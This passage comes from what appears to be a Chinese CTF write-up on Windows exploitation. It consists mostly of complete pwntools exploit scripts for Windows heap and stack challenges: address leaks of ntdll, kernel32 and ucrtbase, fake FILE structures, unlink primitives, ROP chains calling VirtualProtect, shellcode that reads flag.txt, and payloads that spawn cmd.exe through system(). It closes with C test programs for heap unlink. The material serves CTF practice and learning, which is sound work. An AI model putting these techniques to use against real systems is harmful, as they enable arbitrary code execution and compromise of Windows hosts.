'+hex(heapbase)) if(heapbase == 0): p.close() p = remote(ip,port) continue #---------------------------------------------------------------------------------- open_file() fake_file = p64(0)+p64(0xBEEFDAD0000+0x28+0x20) fake_file+= p32(0)+p32(0x2080)+p32(0)+p32(0) fake_file+= p64(0x100)+p64(0) fake_file+= p64(0xffffffffffffffff)+p32(0xffffffff)+p32(0) fake_file+= p64(0)+p64(0) edit(3,fake_file) if(heap_offset == 0): read_file(4,8,p64(target)) else: read_file(4,8,p64(heapbase+target)) show(4) p.recvuntil('Content: ') result = u64(p.recvuntil('\r\n',drop=True).ljust(8,'\x00')) if(result == None): p.close() p = remote(ip,port) continue else: p.close() return result except EOFError: p.close() p = remote(ip,port) continue except KeyboardInterrupt: p.close() exit(0)imoml = leak(PebLdr+0x20)log.success('imoml = '+hex(imoml))imoml_off = imoml &amp; 0xffffbinbase = leak(imoml_off+0x28,1) - 0x1bf0log.success('binbase = '+hex(binbase))KERNEL32 = leak(binbase+0x3000)-(0x00007ffcafb79d80-0x0007ffcafb60000)log.success('KERNEL32 = '+hex(KERNEL32))ucrtbase = leak(binbase+0x30b0)-(0x00007ffcad87c7b0-0x0007ffcad870000)log.success('ucrtbase = '+hex(ucrtbase))pioinfo_ptr = leak(ucrtbase+0xeb750)log.success('pioinfo_ptr = '+hex(pioinfo_ptr))pioinfo_offset = pioinfo_ptr &amp; 0xfffflog.success('pioinfo_offset = '+hex(pioinfo_offset))#-------------------------------------------unlink-----------------------------------------'''ntdll = 0x7ffcb0ad0000PebLdr = 0x7ffcb0c353c0binbase = 0x7ff7427c0000KERNEL32 = 0x7ffcafb60000ucrtbase = 0x7ffcad870000'''p = remote(ip,port)while True: try: for i in range(6): open_file() new(0x88,1) new(0x88,2) new(0xe8,3) new(0x88,5) new(0x88,6) read_file(1,0x88) show(1) p.recvuntil(' al') Encoding = u64(p.recvuntil('\r\n',drop=True).ljust(8,'\x00')) ^ 0x0000000908010009 log.success('Encoding = '+hex(Encoding)) payload = '\x11'*0x88 + p64(0x0800000920010021 ^ Encoding)[:6] edit(1,payload) delete(2) new(0x88,4) show(3) p.recvuntil('Content: ') heapbase = (u64(p.recvuntil('\r\n',drop=True).ljust(8,'\x00'))-0x10000) &amp; 0xffffffffffff0000 if(heapbase != 0): log.success('heapbase = '+hex(heapbase)) else: p.close() p = remote('192.168.21.1',10000) continue #---------------------------------------------------------------------------------- open_file() new(0x88,7) new(0x88,0x0800000613010012 ^ Encoding) fake_file = p64(0)+p64(0xBEEFDAD0000+0x28+0x20) fake_file+= p32(0)+p32(0x2080)+p32(0)+p32(0) fake_file+= p64(0x100)+p64(0) fake_file+= p64(0xffffffffffffffff)+p32(0xffffffff)+p32(0) fake_file+= p64(0)+p64(0) edit(3,fake_file+p64(0)+p64(0x0800000613010012 ^ Encoding)) delete(7) new(0x88,9) #改ucrtbase!_pioinfo[0].flag read_file(4,8,p64(heapbase+0x8740+0x38)) edit(4,p8(0xc1)) edit(5,p64(0xBEEFDAD0000+6*0x28+0x20-0x8)+p64(0xBEEFDAD0000+6*0x28+0x20)) new(0x88,10) edit(0x0800000613010012 ^ Encoding, flat([0, 0xDDAABEEF1ACD, 0x200, 100, 0xDDAABEEF1ACD, 0xBEEFDAD0000])) payload = p64(0xDDAABEEF1ACD)+p64(0x1000) payload+= p64(1)+p64(0xDDAABEEF1ACD) payload+= p64(0xBEEFDAD0000) payload+= p64(0xDDAABEEF1ACD)+p64(0x1000) payload+= p64(2)+p64(0xDDAABEEF1ACD) payload+= p64(PebLdr-0x38) edit(100,payload) show(2) p.recvuntil('Content: ') Peb = u64(p.recvuntil('\r\n',drop=True).ljust(8,'\x00')) - 0x340 Teb = Peb + 0x1000 log.success('Peb = '+hex(Peb)) log.success('Teb = '+hex(Teb)) payload = p64(0xDDAABEEF1ACD)+p64(0x1000) payload+= p64(1)+p64(0xFACE6DA61A35C767) payload+= p64(0xBEEFDAD0000) payload+= p64(0xDDAABEEF1ACD)+p64(0x1000) payload+= p64(2)+p64(0xDDAABEEF1ACD) payload+= p64(Teb+0xa) edit(1,payload) show(2) p.recvuntil('Content: ') stack = u64(p.recvuntil('\r\n',drop=True).ljust(8,'\x00')) &lt;&lt; 16 log.success('stack = '+hex(stack)) main_ret_content = binbase + 0x1B78 main_ret_addr = 0 key = 0 for addr in range(stack-0x800,stack,9*0x8): if key == 1: break log.info('addr = '+hex(addr)) payload = p64(0xDDAABEEF1ACD)+p64(0x1000) payload+= p64(1)+p64(0xFACE6DA61A35C767) payload+= p64(0xBEEFDAD0000) payload+= p64(0xDDAABEEF1ACD)+p64(0x1000) payload+= p64(2)+p64(0xDDAABEEF1ACD) payload+= p64(addr) payload+= p64(0xDDAABEEF1ACD)+p64(0x1000) payload+= p64(3)+p64(0xDDAABEEF1ACD) payload+= p64(addr+0x08) payload+= p64(0xDDAABEEF1ACD)+p64(0x1000) payload+= p64(4)+p64(0xDDAABEEF1ACD) payload+= p64(addr+0x10) payload+= p64(0xDDAABEEF1ACD)+p64(0x1000) payload+= p64(5)+p64(0xDDAABEEF1ACD) payload+= p64(addr+0x18) payload+= p64(0xDDAABEEF1ACD)+p64(0x1000) payload+= p64(6)+p64(0xDDAABEEF1ACD) payload+= p64(addr+0x20) payload+= p64(0xDDAABEEF1ACD)+p64(0x1000) payload+= p64(7)+p64(0xDDAABEEF1ACD) payload+= p64(addr+0x28) payload+= p64(0xDDAABEEF1ACD)+p64(0x1000) payload+= p64(8)+p64(0xDDAABEEF1ACD) payload+= p64(addr+0x30) payload+= p64(0xDDAABEEF1ACD)+p64(0x1000) payload+= p64(9)+p64(0xDDAABEEF1ACD) payload+= p64(addr+0x38) payload+= p64(0xDDAABEEF1ACD)+p64(0x1000) payload+= p64(10)+p64(0xDDAABEEF1ACD) payload+= p64(addr+0x40) edit(1,payload) if(main_ret_addr == 0): for i in range(2,11): show(i) p.recvuntil('Content: ') result = u64(p.recvuntil('\r\n',drop=True)[:8].ljust(8,'\x00')) if(result == main_ret_content): main_ret_addr = addr+(i-2)*0x8 key = 1 break if(main_ret_addr == 0): log.info('bad luck....') exit(0) log.success('main_ret_addr = '+hex(main_ret_addr)) #-------------------------------------------------------------- pop_rdx_rcx_r8_r9_r10_r11 = ntdll + 0x8FB20 VirtualProtectStub = KERNEL32 + 0x1b680 HeapCreateStub = KERNEL32 + (0x00007ffcafb7ec80-0x00007ffcafb60000) ProcessHeap = Peb+0x30 _open = ucrtbase + (0x0007ffcad912a30-0x00007ffcad870000) _read = ucrtbase + 0x16270 _sleep = ucrtbase + (0x0007ffcad9219d0-0x00007ffcad870000) _write = ucrtbase + (0x00007ffcad885bf0-0x00007ffcad870000) _exit = ucrtbase + (0x00007ffcad8e06d0-0x00007ffcad870000) _acrt_heap = ucrtbase + 0xeb550 #00007ffc`ad95b550 ucrtbase!_acrt_heap = &lt;no type information&gt; buf = binbase + 0x5e00 shellcode_addr = binbase + 0x5800 shellcode = '\x90'*0x20 + asm(""" xor rcx,rcx xor rdx,rdx xor r8,r8 xor r9,r9 xor rdi,rdi mov cl,2 mov rdi,0x%x call rdi mov rdi,0x%x mov qword ptr [rdi],rax mov rdi,0x%x mov qword ptr [rdi],rax sub rsp,0x1000 open : mov rdi,0x%x mov rcx,0x%x xor rdx,rdx call rdi read: mov rcx,rax mov rdx,0x%x mov rdi,0x%x mov r8,0x40 call rdi write : mov r8,rax mov rdx,0x%x xor rcx,rcx inc rcx mov rdi,0x%x call rdi sleep: mov rcx,20 mov rdi,0x%x call rdi exit: mov rdi,0x%x call rdi """ % (HeapCreateStub,ProcessHeap,_acrt_heap,_open,buf,buf,_read,buf,_write,_sleep,_exit)) rop = p64(pop_rdx_rcx_r8_r9_r10_r11) rop+= p64(0x1000) rop+= p64(binbase+0x5000) rop+= p64(0x40) rop+= p64(shellcode_addr-8) rop+= p64(0) rop+= p64(0) rop+= p64(VirtualProtectStub) rop+= p64(shellcode_addr) payload = p64(0xDDAABEEF1ACD)+p64(0x1000) payload+= p64(1)+p64(0xFACE6DA61A35C767) payload+= p64(0xBEEFDAD0000) payload+= p64(0xDDAABEEF1ACD)+p64(0x200) payload+= p64(2)+p64(0xDDAABEEF1ACD) payload+= p64(shellcode_addr) payload+= p64(0xDDAABEEF1ACD)+p64(0x200) payload+= p64(3)+p64(0xDDAABEEF1ACD) payload+= p64(buf) payload+= p64(0xDDAABEEF1ACD)+p64(0x200) payload+= p64(4)+p64(0xDDAABEEF1ACD) payload+= p64(main_ret_addr-0x80) edit(1,payload) edit(2,shellcode) edit(3,'flag.txt') edit(4,rop) break except EOFError: p.close() p = remote(ip,port) continue except KeyboardInterrupt: p.close() exit(0)p.interactive() 官方exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *import timehost = "10.211.55.27"port = 6677context.arch = "amd64" def allocate(size,idx): r.recvuntil("choice: ") r.sendline("1") r.recvuntil(":") r.sendline(str(size)) r.recvuntil(":") r.sendline(str(idx))def edit(idx,data): r.recvuntil("choice: ") r.sendline("2") r.recvuntil(":") r.sendline(str(idx)) r.recvuntil(":") r.send(data)def show(idx): r.recvuntil("choice: ") r.sendline("3") r.recvuntil(":") r.sendline(str(idx))def free(idx): r.recvuntil("choice: ") r.sendline("4") r.recvuntil(":") r.sendline(str(idx))def openfile(): r.recvuntil("choice: ") r.sendline("5") r.recvuntil(":") r.sendline("1") r.recvuntil(":") r.sendline("3")def readfile(idx,size,ret=True): r.recvuntil("choice: ") r.sendline("5") r.recvuntil("choice: ") time.sleep(0.1) r.sendline("2") time.sleep(0.1) r.recvuntil(":") r.sendline(str(idx)) r.recvuntil(":") time.sleep(0.1) r.sendline(str(size)) if ret : r.recvuntil("choice: ") r.sendline("3")def leak(addr=None,heapoff=None): for i in range(6): openfile() allocate(0x228,1338) allocate(0x228,1337) allocate(0x228,1336) edit(1337,"a"*0x228) show(1337) r.recvuntil("a"*0x228) cookie = (u64(r.recvuntil("\n")[:-2].ljust(8,"\x00")) ^ 0x2322010023) &amp; 0xffffffffffff print "cookie:",hex(cookie) allocate(0x268,1332) allocate(0x5a0,1331) allocate(0x1000,1330) allocate(0x280,1333) allocate(0x280,cookie^0x37010137) # allocate(0x163,4141) openfile() readfile(1332,0x268) fakechunk = 0x27ae0101ae ^ cookie time.sleep(0.1) edit(1332,"b"*0x268 + p64(fakechunk)[:6]) free(1331) allocate(0x5a0,1331) show(1330) r.recvuntil("Content: ") heap_var = u64(r.recvuntil("\n")[:-2].ljust(8,"\x00")) if heap_var == 0 : print "fuck heap 0" raise EOFError if (heap_var &amp; 0xffff) == 0x150 : heap = heap_var - 0x150 elif heap_var &lt; 0x10000: print "fuck heap &lt; 0x10000" raise EOFError else : heap = (heap_var &amp; 0xffffffffffff0000) - 0x10000 print "heap:",hex(heap) var = heap_var while var == heap_var : openfile() show(1330) r.recvuntil("Content: ") var = u64(r.recvuntil("\n")[:-2].ljust(8,"\x00")) subsegment = heap + 0x021e80 reserve = heap + 0x28b40 size_idx = 0xc sig = 0xf0e0d0c0 fake_userdata = p64(subsegment) + p64(reserve) + p32(size_idx) + p32(sig) fake_userdata += p64(0)*5 filebuffer = 0xbeefdad0000 ptr = filebuffer+0x20 base = filebuffer+0x20 cnt = 0 flag = 0x2049 fd = 0 pad = 0 bufsize = 0x800 obj = p64(0)*2 + p64(ptr) + p64(base) + p32(cnt) + p32(flag) + p32(fd) + p32(pad) + p64(bufsize) + p64(0) obj += p64(0xffffffffffffffff) + p32(0xffffffff) + p32(0) + p64(0)*2 edit(1330,fake_userdata + obj*0x28) readfile(1338,0x8,False) magic = 0xddaabeef1acd #stage1 if not addr and not heapoff: time.sleep(0.1) r.send(p64(heap+0x2c0)) r.recvuntil("choice: ") r.sendline("3") show(1338) r.recvuntil("Content: ") return u64(r.recvuntil("\n")[:-2].ljust(8,"\x00")) -0x163d50 elif heapoff: time.sleep(0.1) r.send(p64(heap+heapoff)) r.recvuntil(":") r.sendline("3") show(1338) r.recvuntil("Content: ") return u64(r.recvuntil("\n")[:-2].ljust(8,"\x00")) else : time.sleep(0.1) r.send(p64(addr)) r.recvuntil("choice: ") r.sendline("3") show(1338) r.recvuntil("Content: ") return u64(r.recvuntil("\n")[:-2].ljust(8,"\x00"))count = 0def exp(): for i in range(6): openfile() allocate(0x228,1338) allocate(0x228,1337) allocate(0x228,1336) edit(1337,"a"*0x228) show(1337) r.recvuntil("a"*0x228) cookie = (u64(r.recvuntil("\n")[:-2].ljust(8,"\x00")) ^ 0x2322010023) &amp; 0xffffffffffff print "cookie:",hex(cookie) allocate(0x268,1332) allocate(0x5a0,1331) allocate(0x1000,1330) allocate(0x280,1333) allocate(0x280,cookie^0x37010137) #allocate(0x163,4141) openfile() readfile(1332,0x268) fakechunk = 0x27ae0101ae ^ cookie edit(1332,"b"*0x268 + p64(fakechunk)[:6]) free(1331) allocate(0x5a0,1331) show(1330) r.recvuntil("Content: ") heap_var = u64(r.recvuntil("\n")[:-2].ljust(8,"\x00")) if heap_var == 0 : raise EOFError if (heap_var &amp; 0xffff) == 0x150 : heap = heap_var - 0x150 elif heap_var &lt; 0x10000: raise EOFError else : heap = (heap_var &amp; 0xffffffffffff0000) - 0x10000 print "heap:",hex(heap) var = heap_var while var == heap_var : openfile() show(1330) r.recvuntil("Content: ") var = u64(r.recvuntil("\n")[:-2].ljust(8,"\x00")) subsegment = heap + 0x021e80 reserve = heap + 0x28b40 size_idx = 0xc sig = 0xf0e0d0c0 fake_userdata = p64(subsegment) + p64(reserve) + p32(size_idx) + p32(sig) fake_userdata += p64(0)*5 filebuffer = 0xbeefdad0000 global ucrtbase pioinfo = ucrtbase + 0xeb750 ptr = filebuffer + 0x20 base = filebuffer + 0x20 cnt = 0 flag = 0x2049 fd = 0 pad = 0 bufsize = 0x800 obj =p64(0)*2 + p64(ptr) + p64(base) + p32(cnt) + p32(flag) + p32(fd) + p32(pad) + p64(bufsize) + p64(0) obj += p64(0xffffffffffffffff) + p32(0xffffffff) + p32(0) + p64(0)*2 edit(1330,fake_userdata + obj*0x28) readfile(1338,8,False) global pioinfo_off magic = 0xddaabeef1acd r.send(p64(heap+pioinfo_off+0x38)) time.sleep(0.1) r.recvuntil("choice: ") r.sendline("3") edit(1338,p8(0x09)) allocate(0x510,4242) target = filebuffer + 0x138 free(1333) allocate(0x280,4343) edit(4242,"a"*0x288 + p64(0x2929000029^cookie) + p64(target-8) + p64(target)) allocate(0x280,5566) fake_filebuffer = flat([magic,0x200,0xda,magic,filebuffer]) edit(cookie^0x37010137, p64(filebuffer) + fake_filebuffer) for i in range(9): fake_filebuffer += flat([magic,0x200,0xda + i,magic,filebuffer]) edit(0xda,fake_filebuffer) def readmem(addr): global count if count % 2 == 0 : fake_filebuffer = flat([magic,0x200,0xda,magic,addr]) + flat([magic,0x200,0xdada,magic,filebuffer]) edit(0xda,fake_filebuffer) show(0xda) else : fake_filebuffer = flat([magic,0x200,0xda,magic,filebuffer]) + flat([magic,0x200,0xdada,magic,addr]) edit(0xdada,fake_filebuffer) show(0xdada) count += 1 r.recvuntil("Content: ") return u64(r.recvuntil("\n")[:-2].ljust(8,"\x00")) global ntdll if ntdll == 0 : ntdll = readmem(heap+0x2c0) - 0x163d50 print "ntdll:",hex(ntdll) peb = readmem(ntdll+0x165348) - 0x80 print "peb:",hex(peb) global Pebldr if Pebldr == 0 : Pebldr = ntdll+ 0x1653c0 print "PebLdr:",hex(Pebldr) global bin_base if bin_base == 0 : imoml = readmem(Pebldr+0x20) bin_base = readmem(imoml+0x28) - 0x1b80 - 0x70 print "bin_base:",hex(bin_base) iat = bin_base + 0x3000 kernel32 = readmem(iat+8) - 0x1e690 print "kernel32:",hex(kernel32) ucrtbase = readmem(iat+0x110) - 0x6f1e0 teb = peb + 0x1000 stack = readmem(teb+0x10+1) &lt;&lt; 8 print "stack:",hex(stack) start = stack+0x3ff8 printf_ret = bin_base + 0x17c4 ret_addr = 0 for i in range(0x2000/8): try : val = readmem(start-i*8) print "search : %d" % i if val == printf_ret : print "found !" ret_addr = start - i*8 break except : continue if ret_addr == 0 : exit() print "ret_addr:" ,hex(ret_addr) def writemem(addr,data): global count if count % 2 == 0 : fake_filebuffer = flat([magic,0x200,0xda,magic,addr]) + flat([magic,0x200,0xdada,magic,filebuffer]) + flat([magic,0x200,0xddaa,magic,addr]) edit(0xda,fake_filebuffer) else : fake_filebuffer = flat([magic,0x200,0xda,magic,filebuffer]) + flat([magic,0x200,0xdada,magic,addr])+ flat([magic,0x200,0xddaa,magic,addr]) edit(0xdada,fake_filebuffer) count += 1 edit(0xddaa,data) buf = bin_base + 0x5000 + 0x800 writemem(buf,"flag.txt\x00") pop_rdx_rcx_r8_r9_r10_r11 = ntdll + 0x8c450 winexec = kernel32 + 0x5e970 virutalprotect = kernel32 + 0x1ad00 heapcreate = kernel32 + 0x1e500 processheap = peb+0x30# _open = ucrtbase + 0xa2a30 _open = ucrtbase + 0xa1ae0# _read = ucrtbase + 0x16270 _read = ucrtbase + 0x16140 _sleep = ucrtbase + 0xb0ef0 _write = ucrtbase + 0x14b30 _exit = ucrtbase + 0x6f1a0 crtheap = ucrtbase + 0xeb570 rop = flat([pop_rdx_rcx_r8_r9_r10_r11,0x1000,bin_base+0x5000,0x40,buf+0x40,0,0,virutalprotect,bin_base+0x5000+0x900]) sc = "\x90"*0x20 + asm(""" xor rcx,rcx xor rdx,rdx xor r8,r8 xor r9,r9 xor rdi,rdi mov cl,2 mov rdi,0x%x call rdi mov rdi,0x%x mov qword ptr [rdi],rax mov rdi,0x%x mov qword ptr [rdi],rax sub rsp,0x1000 open : mov rdi,0x%x mov rcx,0x%x xor rdx,rdx call rdi read: mov rcx,rax mov rdx,0x%x mov rdi,0x%x mov r8,0x40 call rdi write : mov r8,rax mov rdx,0x%x xor rcx,rcx inc rcx mov rdi,0x%x call rdi sleep: mov rcx,20 mov rdi,0x%x call rdi exit: mov rdi,0x%x call rdi """ % (heapcreate,processheap,crtheap,_open,buf,buf,_read,buf,_write,_sleep,_exit)) writemem(bin_base+0x5000+0x900,sc) writemem(ret_addr,rop) r.interactive()ntdll = 0imoml_off = 0bin_base = 0Pebldr = 0ucrtbase = 0pioinfo_off = 0if ntdll == 0 and ucrtbase == 0 : i = 0 while 1: try : r = remote(host,port) ntdll = leak() - 0x20 print "ntdll",hex(ntdll) r.recvuntil(":") r.sendline("6") r.close() break except EOFError: continue except KeyboardInterrupt: raise finally: i += 1 r.close()else : print "ntdll",hex(ntdll)if imoml_off == 0 : i = 0 while 1: try : r = remote(host,port) Pebldr = ntdll + 0x1653c0 print "PebLdr:",hex(Pebldr) imoml = leak(Pebldr+0x20) print "imoml:",hex(imoml) imoml_off = imoml &amp; 0xffff r.recvuntil(":") r.sendline("6") r.close() break except EOFError: continue except KeyboardInterrupt: raise finally: i+=1 r.close()else : print "imoml:",hex(imoml_off)if bin_base == 0 and ucrtbase == 0: i = 0 while 1: try : r = remote(host,port) bin_base = leak(None,imoml_off+0x28) - 0x1bf0 print "bin_base:",hex(bin_base) r.recvuntil(":") r.sendline("6") r.close() break except EOFError: continue except KeyboardInterrupt: raise finally: i += 1 r.close()else: print "bin_base:",hex(bin_base)if ucrtbase == 0 : i = 0 while 1: try : r = remote(host,port) iat = bin_base + 0x3000 ucrtbase = leak(iat+0x110) - 0x6f1e0 print "ucrtbase:",hex(ucrtbase) r.recvuntil(":") r.sendline("6") r.close() break except EOFError: continue except KeyboardInterrupt: raise finally: i += 1 r.close()else: print "ucrtbase:",hex(ucrtbase)if pioinfo_off == 0 : i = 0 while 1: try : r = remote(host,port) pioinfo = leak(ucrtbase+0xeb770) print "pioinfo:",hex(pioinfo) pioinfo_off = pioinfo &amp; 0xffff r.recvuntil(":") r.sendline("6") r.close() if pioinfo == 0 : r = remote(host,port) pioinfo = leak(ucrtbase+0xeb771) &lt;&lt; 8 print "pioinfo:",hex(pioinfo) pioinfo_off = pioinfo &amp; 0xffff r.recvuntil(":") r.sendline("6") r.close() break except EOFError: continue except KeyboardInterrupt: raise finally: i+=1 r.close()else : print "pioinfo_off:",hex(pioinfo_off)while 1: try : r= remote(host,port) exp() except EOFError: continue except KeyboardInterrupt: raise finally : r.close() winpwn1思路：某个网站的winpwn1，是个栈溢出，本地打通，但是远程不通。。。远程一直泄露不出来，我偏移爆破也没试出来。。。之前看一个大佬说win下打通本地打不通远程的情况要比linux下复杂的多，现在终于遇到了。以后有时间再研究。 栈迁移即可，可能找gadget需要思路比较灵活。 exp：123456789101112131415161718192021222324252627282930313233343536373839404142#coding:utf-8from pwn import *p = remote('192.168.21.1',8889)#p = remote('winpwn.eonew.cn',20001)#context.log_level = 'debug'puts_IAT = 0x4020c4main = 0x401130 #0x0040190a : pop ebx ; ret#0x0040136d : pop ecx ; pop ecx ; ret#0x00401908 : pop edi ; pop esi ; pop ebx ; retstack = 0x1f000p.recvuntil('Win pwn 1\r\n')payload = '\x11'*0x80payload+= p32(stack)payload+= p32(0x401143) payload+= p32(puts_IAT)raw_input('[+] please Enter to continue...')p.send(payload)p.recvuntil('\r\n')ucrtbase = u32(p.recv(4)) - (0x75fc89f0-0x75f10000) log.success('ucrtbase = '+hex(ucrtbase))system = ucrtbase + (0x75fffda0-0x75f10000)payload = '\x22'*0x80payload+= p32(0xdeadbeef)payload+= p32(system)payload+= p32(0xdeadbeef)payload+= p32(stack+0x78)payload = payload.ljust(0xf8,'\x00')payload+= 'cmd.exe\x00'raw_input('[+] please Enter to continue...')p.send(payload)p.interactive() orw_exp：用ucrtbase!_open/ucrtbase!_read/puts打印出flag文件。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#coding:utf-8from pwn import *p = remote('192.168.21.1',8880)#p = remote('winpwn.eonew.cn',20001)#context.log_level = 'debug'puts_IAT = 0x4020c4main = 0x401130 #0x0040190a : pop ebx ; ret#0x0040136d : pop ecx ; pop ecx ; ret#0x00401908 : pop edi ; pop esi ; pop ebx ; retstack = 0x1f000p.recvuntil('Win pwn 1\r\n')payload = '\x11'*0x80payload+= p32(stack)payload+= p32(0x401143) payload+= p32(puts_IAT)raw_input('[+] please Enter to continue...')p.send(payload)p.recvuntil('\r\n')ucrtbase = u32(p.recv(4)) - (0x75fc89f0-0x75f10000) log.success('ucrtbase = '+hex(ucrtbase))_open = ucrtbase + (0x75ff1030-0x75f10000)_read = ucrtbase + (0x75f3b600-0x75f10000)puts = ucrtbase + (0x75fc89f0-0x75f10000)payload = '\x22'*0x80payload+= p32(0xdeadbeef)payload+= p32(_open)payload+= p32(0x40136d)payload+= p32(stack+0x78)payload+= p32(2)payload+= p32(_read)payload+= p32(0x401908)payload+= p32(3)payload+= p32(stack+0x100)payload+= p32(0x20)payload+= p32(puts)payload+= p32(0xdeadbeef)payload+= p32(stack+0x100)payload = payload.ljust(0xf8,'\x00')payload+= 'flag.txt\x00'raw_input('[+] please Enter to continue...')p.send(payload)p.interactive() winpwn22020SCTF_EasyWinHeap相当简单的一道题。。。算是在正式比赛里出现过的最简单的winheap了，只是很久没看了，windbg的命令都忘得差不多了，拿起来复习了一遍，(幸好当时记了不少笔记)。。。 思路：用UAF泄露出_heap，因为出题人刻意把ptrlist放到了heap上，所以我们直接可以进行unlink，然后任意地址读写，但是出题人太贴心了，连函数指针都给我们准备好了。。。直接改函数指针，system(cmd)即可。 myexp：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#coding:utf-8from pwn import *local = 0if local == 1: p = remote('192.168.21.1',8888)else: p = remote('47.94.245.208',23333)context.log_level = 'debug'def new(size): p.recvuntil('option &gt;\r\n') p.sendline('1') p.recvuntil('size &gt;\r\n') p.sendline(str(size))def delete(idx): p.recvuntil('option &gt;\r\n') p.sendline('2') p.recvuntil('index &gt;\r\n') p.sendline(str(idx))def edit(idx,content): p.recvuntil('option &gt;\r\n') p.sendline('4') p.recvuntil('index &gt;\r\n') p.sendline(str(idx)) p.recvuntil('content &gt;\r\n') p.send(content)def show(idx): p.recvuntil('option &gt;\r\n') p.sendline('3') p.recvuntil('index &gt;\r\n') p.sendline(str(idx))new(0x70) #0new(0x90) #1new(0x70) #2new(0x90) #3new(0x70) #4edit(4,'cmd.exe'+'\n')delete(1)show(1)if local == 1: heapbase = u32(p.recvuntil('\xc0\x0d\x0a',drop=True).ljust(4,'\x00'))-0x580else: heapbase = u32(p.recvuntil('\x0d\x0a',drop=True).ljust(4,'\x00'))-0x580log.success('heapbase = '+hex(heapbase))delete(3)edit(1,p32(heapbase+0x4a0)+p32(heapbase+0x4a4)+'\n')delete(0)payload = p32(heapbase+0x4a0)edit(1,payload+'\n')show(1)if local == 1: codebase = u32(p.recvuntil('\x0d\x0a',drop=True).ljust(4,'\x00'))-0x104aelse: codebase = u32(p.recvuntil('\xa0\x04',drop=True).ljust(4,'\x00'))-0x104alog.success('codebase = '+hex(codebase))payload = p32(codebase+0x104a)+p32(codebase+0x2054)payload+= p32(codebase+0x104a)+p32(heapbase+0x4a0)edit(1,payload+'\n')show(1)if local == 1: ucrtbase = u32(p.recv(4))-(0x76fe27e0-0x76fa0000)else: ucrtbase = u32(p.recv(4))-(0x10047ad0-0x10001000)log.success('ucrtbase = '+hex(ucrtbase))if local == 1: system_addr = ucrtbase+(0x7708c090-0x76fa0000)else: system_addr = ucrtbase+(0x100efda0-0x10001000)payload = p32(system_addr)+p32(heapbase+0x570)edit(2,payload+'\n')show(1) #triggerp.recvuntil('&gt;')p.sendline('chcp 65001')p.recvuntil('&gt;')p.sendline('cmd.exe')p.recvuntil('cmd.exe')p.interactive() Exploitation in WindowsBackEnd-Unlink关于unlink的实验：在HeapFree中触发unlink：x64成功案例： 12345678910111213141516171819202122232425#include &lt;stdio.h&gt; #include &lt;windows.h&gt;HANDLE hHeap = NULL;char* ptr[5];int main() &#123; hHeap = HeapCreate(HEAP_NO_SERIALIZE, 0x2000, 0x2000); //system("pause"); ptr[0] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20); ptr[1] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x28); ptr[2] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20); ptr[3] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x28); ptr[4] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20); HeapFree(hHeap, 0, ptr[1]); HeapFree(hHeap, 0, ptr[3]); printf("%p: %p\n", &amp;ptr[1], ptr[1]); *(void**)(ptr[1]) = &amp;ptr[1] - 1; *(void**)(ptr[1] + 8) = &amp;ptr[1]; HeapFree(hHeap, 0, ptr[0]); printf("%p: %p\n", &amp;ptr[1], ptr[1]); printf("success!!!\n"); return 0;&#125; 失败案例1： 12345678910111213141516171819202122232425#include &lt;stdio.h&gt; #include &lt;windows.h&gt;HANDLE hHeap = NULL;char* ptr[5];int main() &#123; hHeap = HeapCreate(HEAP_NO_SERIALIZE, 0x2000, 0x2000); //system("pause"); ptr[0] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20); ptr[1] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x28); ptr[2] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20); ptr[3] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x18); // &lt; == change point ptr[4] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20); HeapFree(hHeap, 0, ptr[1]); HeapFree(hHeap, 0, ptr[3]); printf("%p: %p\n", &amp;ptr[1], ptr[1]); *(void**)(ptr[1]) = &amp;ptr[1] - 1; *(void**)(ptr[1] + 8) = &amp;ptr[1]; HeapFree(hHeap, 0, ptr[0]); printf("%p: %p\n", &amp;ptr[1], ptr[1]); printf("success!!!\n"); return 0;&#125; 失败案例2： 12345678910111213141516171819202122232425#include &lt;stdio.h&gt; #include &lt;windows.h&gt;HANDLE hHeap = NULL;char* ptr[5];int main() &#123; hHeap = HeapCreate(HEAP_NO_SERIALIZE, 0x2000, 0x2000); //system("pause"); ptr[0] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20); ptr[1] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x28); ptr[2] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20); ptr[3] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x28); ptr[4] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20); HeapFree(hHeap, 0, ptr[1]); //HeapFree(hHeap, 0, ptr[3]); // &lt; == change point printf("%p: %p\n", &amp;ptr[1], ptr[1]); *(void**)(ptr[1]) = &amp;ptr[1] - 1; *(void**)(ptr[1] + 8) = &amp;ptr[1]; 